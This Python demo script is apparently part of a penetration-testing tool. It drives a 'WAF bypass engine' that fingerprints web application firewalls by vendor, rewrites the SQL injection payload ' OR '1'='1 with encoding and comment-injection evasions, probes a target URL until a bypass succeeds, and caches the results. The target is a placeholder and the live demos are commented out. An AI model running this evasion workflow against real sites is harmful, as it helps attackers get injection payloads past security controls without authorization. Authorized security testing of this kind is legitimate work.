"""
Demo script for WAF Bypass Engine

This script demonstrates how to use the WAF bypass engine to detect
and evade web application firewalls.
"""

import asyncio
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.core.waf_bypass_engine import WAFBypassEngine, BypassTechnique
from app.core.request_handler import RequestHandler


async def demo_waf_detection():
    """Demonstrate WAF detection"""
    print("=" * 60)
    print("WAF Detection Demo")
    print("=" * 60)
    
    # Initialize
    request_handler = RequestHandler()
    waf_engine = WAFBypassEngine(request_handler)
    
    # Example target (replace with actual target)
    target_url = "https://example.com"
    
    print(f"\n[*] Testing target: {target_url}")
    print("[*] Sending test payloads to detect WAF...")
    
    # Detect WAF
    waf_info = await waf_engine.detect_waf(
        url=target_url,
        test_payload="' OR '1'='1"
    )
    
    if waf_info:
        print(f"\n[+] WAF Detected!")
        print(f"    Vendor: {waf_info.vendor}")
        print(f"    Confidence: {waf_info.confidence:.2f}")
        print(f"    Detected from:")
        for indicator in waf_info.detected_from:
            print(f"      - {indicator}")
        
        if waf_info.blocking_patterns:
            print(f"    Blocking patterns:")
            for pattern in waf_info.blocking_patterns:
                print(f"      - {pattern}")
    else:
        print("\n[-] No WAF detected")
    
    await request_handler.close()
    return waf_info


async def demo_bypass_techniques():
    """Demonstrate bypass techniques"""
    print("\n" + "=" * 60)
    print("Bypass Techniques Demo")
    print("=" * 60)
    
    waf_engine = WAFBypassEngine()
    
    # Get all techniques
    print("\n[*] Available bypass techniques:")
    techniques = waf_engine.get_bypass_techniques()
    
    for i, tech in enumerate(techniques, 1):
        print(f"\n{i}. {tech.name}")
        print(f"   Category: {tech.category}")
        print(f"   Description: {tech.description}")
        print(f"   Effectiveness: {tech.effectiveness}")
    
    # Demonstrate applying techniques
    print("\n" + "=" * 60)
    print("Applying Bypass Techniques")
    print("=" * 60)
    
    original_payload = "' OR '1'='1"
    print(f"\nOriginal payload: {original_payload}")
    
    # Apply various techniques
    techniques_to_demo = [
        "URL Encoding",
        "Double URL Encoding",
        "Case Variation",
        "Comment Injection",
    ]
    
    for tech_name in techniques_to_demo:
        # Find the technique
        technique = next((t for t in techniques if t.name == tech_name), None)
        if technique:
            bypassed = waf_engine.apply_bypass(original_payload, technique)
            print(f"\n{tech_name}:")
            print(f"  {bypassed}")


async def demo_bypass_testing():
    """Demonstrate bypass testing"""
    print("\n" + "=" * 60)
    print("Bypass Testing Demo")
    print("=" * 60)
    
    # Initialize
    request_handler = RequestHandler()
    waf_engine = WAFBypassEngine(request_handler)
    
    # Example target (replace with actual target)
    target_url = "https://example.com"
    payload = "' OR '1'='1"
    
    print(f"\n[*] Target: {target_url}")
    print(f"[*] Payload: {payload}")
    print("[*] Testing bypass techniques...")
    
    # Get techniques
    techniques = waf_engine.get_bypass_techniques()
    
    # Test first few techniques
    for i, technique in enumerate(techniques[:3], 1):
        print(f"\n[*] Testing technique {i}: {technique.name}")
        
        result = await waf_engine.test_bypass(
            url=target_url,
            payload=payload,
            technique=technique
        )
        
        if result.success:
            print(f"    [+] SUCCESS! Bypass worked!")
            print(f"        Original blocked: {result.original_blocked}")
            print(f"        Bypassed blocked: {result.bypassed_blocked}")
        else:
            print(f"    [-] Failed")
            if result.error:
                print(f"        Error: {result.error}")
    
    await request_handler.close()


async def demo_find_working_bypass():
    """Demonstrate finding a working bypass"""
    print("\n" + "=" * 60)
    print("Find Working Bypass Demo")
    print("=" * 60)
    
    # Initialize
    request_handler = RequestHandler()
    waf_engine = WAFBypassEngine(request_handler)
    
    # Example target (replace with actual target)
    target_url = "https://example.com"
    payload = "' OR '1'='1"
    
    print(f"\n[*] Target: {target_url}")
    print(f"[*] Payload: {payload}")
    print("[*] Automatically finding working bypass...")
    
    # First detect WAF
    waf_info = await waf_engine.detect_waf(target_url, payload)
    
    waf_vendor = None
    if waf_info:
        print(f"\n[+] WAF detected: {waf_info.vendor}")
        waf_vendor = waf_info.vendor
    
    # Find working bypass
    result = await waf_engine.find_working_bypass(
        url=target_url,
        payload=payload,
        waf_vendor=waf_vendor,
        max_attempts=5
    )
    
    if result and result.success:
        print(f"\n[+] Found working bypass!")
        print(f"    Technique: {result.technique.name}")
        print(f"    Category: {result.technique.category}")
        print(f"    Response status: {result.response.status_code}")
        
        # Show the bypassed payload
        bypassed = waf_engine.apply_bypass(payload, result.technique)
        print(f"\n    Original:  {payload}")
        print(f"    Bypassed:  {bypassed}")
    else:
        print("\n[-] No working bypass found")
    
    await request_handler.close()


async def demo_bypass_persistence():
    """Demonstrate bypass persistence"""
    print("\n" + "=" * 60)
    print("Bypass Persistence Demo")
    print("=" * 60)
    
    waf_engine = WAFBypassEngine()
    
    # Simulate saving a successful bypass
    print("\n[*] Simulating successful bypass...")
    
    technique = BypassTechnique(
        name="Double URL Encoding",
        description="Apply URL encoding twice",
        category="encoding",
        apply_function="apply_double_url_encoding",
        effectiveness="high",
    )
    
    waf_engine.save_successful_bypass(
        url="https://example.com",
        waf_vendor="Cloudflare",
        technique=technique,
        payload="' OR '1'='1",
        bypassed_payload="%2527%2520OR%2520%25271%2527%253D%25271"
    )
    
    print("[+] Bypass saved!")
    
    # Retrieve cached bypasses
    print("\n[*] Retrieving cached bypasses for Cloudflare...")
    cached = waf_engine.get_cached_bypasses("Cloudflare")
    
    print(f"[+] Found {len(cached)} cached technique(s):")
    for tech in cached:
        print(f"    - {tech.name} ({tech.effectiveness} effectiveness)")
    
    # Export patterns
    print("\n[*] Exporting bypass patterns...")
    patterns = waf_engine.export_bypass_patterns()
    print(f"[+] Exported {len(patterns['bypass_cache'])} vendor(s)")
    print(f"[+] Exported {len(patterns['successful_bypasses'])} URL(s)")
    
    # Import patterns (to new engine)
    print("\n[*] Importing patterns to new engine...")
    new_engine = WAFBypassEngine()
    new_engine.import_bypass_patterns(patterns)
    
    cached_new = new_engine.get_cached_bypasses("Cloudflare")
    print(f"[+] New engine has {len(cached_new)} cached technique(s)")


async def demo_vendor_specific_bypasses():
    """Demonstrate vendor-specific bypass techniques"""
    print("\n" + "=" * 60)
    print("Vendor-Specific Bypasses Demo")
    print("=" * 60)
    
    waf_engine = WAFBypassEngine()
    
    vendors = ["Cloudflare", "ModSecurity", "AWS WAF", "Imperva"]
    
    for vendor in vendors:
        print(f"\n[*] Bypass techniques for {vendor}:")
        techniques = waf_engine.get_bypass_techniques(vendor)
        
        # Show top 3 prioritized techniques
        for i, tech in enumerate(techniques[:3], 1):
            print(f"    {i}. {tech.name} ({tech.category})")
        
        # Show bypass headers
        headers = waf_engine.get_bypass_headers(vendor)
        print(f"\n    Bypass headers:")
        for key, value in headers.items():
            print(f"      {key}: {value}")


async def demo_multiple_bypasses():
    """Demonstrate applying multiple bypass techniques"""
    print("\n" + "=" * 60)
    print("Multiple Bypasses Demo")
    print("=" * 60)
    
    waf_engine = WAFBypassEngine()
    
    original_payload = "' OR '1'='1"
    print(f"\nOriginal payload: {original_payload}")
    
    # Get some techniques
    all_techniques = waf_engine.get_bypass_techniques()
    techniques_to_apply = [
        next(t for t in all_techniques if t.name == "Case Variation"),
        next(t for t in all_techniques if t.name == "Comment Injection"),
        next(t for t in all_techniques if t.name == "URL Encoding"),
    ]
    
    print("\n[*] Applying multiple techniques in sequence:")
    for tech in techniques_to_apply:
        print(f"    - {tech.name}")
    
    # Apply all techniques
    result = waf_engine.apply_multiple_bypasses(original_payload, techniques_to_apply)
    
    print(f"\nFinal result: {result}")


async def main():
    """Run all demos"""
    print("\n" + "=" * 60)
    print("WAF Bypass Engine - Complete Demo")
    print("=" * 60)
    
    # Run demos
    try:
        # Demo 1: WAF Detection
        # await demo_waf_detection()
        
        # Demo 2: Bypass Techniques
        await demo_bypass_techniques()
        
        # Demo 3: Bypass Testing
        # await demo_bypass_testing()
        
        # Demo 4: Find Working Bypass
        # await demo_find_working_bypass()
        
        # Demo 5: Bypass Persistence
        await demo_bypass_persistence()
        
        # Demo 6: Vendor-Specific Bypasses
        await demo_vendor_specific_bypasses()
        
        # Demo 7: Multiple Bypasses
        await demo_multiple_bypasses()
        
        print("\n" + "=" * 60)
        print("Demo Complete!")
        print("=" * 60)
        
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    # Note: Demos that require actual HTTP requests are commented out
    # Uncomment them when testing against real targets
    asyncio.run(main())
